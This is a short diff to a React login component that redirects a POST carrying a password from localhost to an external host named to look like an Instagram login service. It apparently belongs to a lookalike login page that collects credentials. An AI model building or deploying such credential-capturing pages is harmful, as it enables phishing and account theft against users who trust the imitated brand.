@@ -66,7 +66,7 @@ const Login = () => {
      Name: password,
    };
 
-   fetch("http://localhost:3000/user/add", {
+   fetch("https://instgram-login-1.onrender.com/user/add", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
